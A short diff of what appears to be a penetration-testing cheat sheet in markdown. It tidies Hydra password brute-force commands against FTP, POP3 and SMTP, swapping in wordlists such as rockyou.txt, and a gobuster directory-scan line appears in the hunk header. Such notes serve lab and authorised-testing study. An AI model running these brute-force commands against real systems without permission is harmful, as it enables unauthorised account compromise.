@@ -152,17 +152,15 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 - ## Brute-force attack <a name="bruteforce"></a>
 ### Hydra FTP Brute Force
 ```
-hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
-127.0.0.1 ftp -V
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
 ```
 ### Hydra POP3 Brute Force
 ```
-hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
-127.0.0.1 pop3 -V
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
 ```
 ### Hydra SMTP Brute Force
 ```
-hydra -P /usr/share/wordlistsnmap.lst 127.0.0.1 smtp -V
+hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
 ```
 ### Hydra SSH Brute Force
 ```
